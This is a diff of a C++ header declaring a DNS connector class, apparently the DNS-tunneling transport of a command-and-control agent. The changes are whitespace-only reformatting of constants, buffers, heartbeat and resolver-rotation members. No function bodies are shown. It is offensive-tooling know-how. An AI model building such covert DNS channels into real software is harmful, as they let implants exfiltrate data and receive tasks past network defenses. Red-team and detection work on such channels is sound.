@@ -25,34 +25,34 @@ struct DNSFUNC {
 // DNS protocol metadata header
 #pragma pack(push, 1)
 typedef struct _DNS_META_V1 {
-    BYTE  version;
-    BYTE  metaFlags;
+    BYTE   version;
+    BYTE   metaFlags;
     USHORT reserved;
-    ULONG downAckOffset;
-} DNS_META_V1, *PDNS_META_V1;
+    ULONG  downAckOffset;
+} DNS_META_V1, * PDNS_META_V1;
 #pragma pack(pop)
 
 class ConnectorDNS
 {
 public:
     // Constants
-    static const ULONG kMaxUploadSize   = 4 << 20;  // 4 MB
-    static const ULONG kMaxDownloadSize = 4 << 20;  // 4 MB
-    static const ULONG kDefaultPktSize  = 1024;
-    static const ULONG kMaxPktSize      = 64000;
-    static const ULONG kMaxSafeFrame    = 60;
+    static const ULONG kMaxUploadSize    = 4 << 20;  // 4 MB
+    static const ULONG kMaxDownloadSize  = 4 << 20;  // 4 MB
+    static const ULONG kDefaultPktSize   = 1024;
+    static const ULONG kMaxPktSize       = 64000;
+    static const ULONG kMaxSafeFrame     = 60;
     static const ULONG kDefaultLabelSize = 48;
-    static const ULONG kMaxLabelSize    = 63;
-    static const ULONG kMetaSize        = sizeof(DNS_META_V1);
-    static const ULONG kHeaderSize      = kMetaSize + 8;  // meta + total + offset
-    static const ULONG kFrameHeaderSize = 9;  // flags:1 + nonce:4 + origLen:4
-    static const ULONG kAckDataSize     = 12;
-    static const ULONG kReqDataSize     = 8;
-    static const ULONG kDnsSignalBits   = 0x1;
-    static const ULONG kMaxResolvers    = 16;
-    static const ULONG kMaxFailCount    = 2;
-    static const ULONG kQueryTimeout    = 3;  // seconds
-    static const ULONG kMaxRetries      = 3;
+    static const ULONG kMaxLabelSize     = 63;
+    static const ULONG kMetaSize         = sizeof(DNS_META_V1);
+    static const ULONG kHeaderSize       = kMetaSize + 8;  // meta + total + offset
+    static const ULONG kFrameHeaderSize  = 9;  // flags:1 + nonce:4 + origLen:4
+    static const ULONG kAckDataSize      = 12;
+    static const ULONG kReqDataSize      = 8;
+    static const ULONG kDnsSignalBits    = 0x1;
+    static const ULONG kMaxResolvers     = 16;
+    static const ULONG kMaxFailCount     = 2;
+    static const ULONG kQueryTimeout     = 3;  // seconds
+    static const ULONG kMaxRetries       = 3;
 
 private:
     ProfileDNS profile = { 0 };
@@ -64,26 +64,26 @@ private:
     ULONG resolverFailCount[kMaxResolvers] = { 0 };
     ULONG resolverDisabledUntil[kMaxResolvers] = { 0 };
 
-    CHAR  sid[17] = { 0 };
+    CHAR  sid[17]        = { 0 };
     BYTE  encryptKey[16] = { 0 };
-    ULONG pktSize = 0;
-    ULONG labelSize = 0;
-    CHAR  domain[256] = { 0 };
-    CHAR  qtype[8] = { 0 };
-    BOOL  initialized = FALSE;
-    BOOL  hiSent = FALSE;
-    BYTE* hiBeat = NULL;
-    ULONG hiBeatSize = 0;
-    ULONG hiRetries = kMaxRetries;
-    ULONG seq = 0;
-    ULONG idx = 0;
+    ULONG pktSize        = 0;
+    ULONG labelSize      = 0;
+    CHAR  domain[256]    = { 0 };
+    CHAR  qtype[8]       = { 0 };
+    BOOL  initialized    = FALSE;
+    BOOL  hiSent         = FALSE;
+    BYTE* hiBeat         = NULL;
+    ULONG hiBeatSize     = 0;
+    ULONG hiRetries      = kMaxRetries;
+    ULONG seq            = 0;
+    ULONG idx            = 0;
 
     BYTE* recvData = NULL;
     int   recvSize = 0;
 
-    BYTE* downBuf    = NULL;
-    ULONG downTotal  = 0;
-    ULONG downFilled = 0;
+    BYTE* downBuf       = NULL;
+    ULONG downTotal     = 0;
+    ULONG downFilled    = 0;
     ULONG downAckOffset = 0;
     ULONG downTaskNonce = 0;
 
@@ -91,7 +91,7 @@ private:
     ULONG lastDownTotal   = 0;
     ULONG lastUpTotal     = 0;
 
-    BOOL  lastQueryOk     = FALSE;
+    BOOL  lastQueryOk = FALSE;
 
     ULONG sleepDelaySeconds = 0;
 
@@ -101,18 +101,17 @@ private:
     // Upload fragment tracking for reliability
     static const ULONG kMaxTrackedOffsets = 256;
     ULONG confirmedOffsets[kMaxTrackedOffsets] = { 0 };
-    ULONG confirmedCount = 0;
+    ULONG confirmedCount      = 0;
     ULONG lastAckNextExpected = 0;
-    BOOL  uploadNeedsReset = FALSE;
-    ULONG uploadStartTime = 0;
+    BOOL  uploadNeedsReset    = FALSE;
+    ULONG uploadStartTime     = 0;
 
     DNSFUNC* functions = NULL;
 
     // Private helper methods
     void  MetaV1Init(DNS_META_V1* h);
     ULONG BuildWireSeq(ULONG logicalSeq, ULONG signalBits);
-    BOOL  QuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR* qtypeStr, 
-                      BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
+    BOOL  QuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
     void  ParseResolvers(const CHAR* resolvers);
     void  BuildAckData(BYTE* ackData, ULONG ackOffset, ULONG nonce, ULONG taskNonce);
     void  SendHeartbeat();
@@ -144,7 +143,7 @@ public:
     ULONG GetLastUpTotal() const { return lastUpTotal; }
     ULONG GetLastDownTotal() const { return lastDownTotal; }
     void  ResetTrafficTotals() { lastUpTotal = 0; lastDownTotal = 0; }
-    
+
     BOOL  WasLastQueryOk() const { return lastQueryOk; }
 
     const BYTE* GetResolvers() const { return profile.resolvers; }
@@ -157,8 +156,7 @@ public:
     BOOL  IsBusy() const;
     ULONG GetDownAckOffset() const { return downAckOffset; }
 
-    BOOL  QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, 
-                            BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
+    BOOL  QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize);
 
     void  ForcePollOnce() { this->forcePoll = TRUE; }
     BOOL  IsForcePollPending() const { return this->forcePoll; }
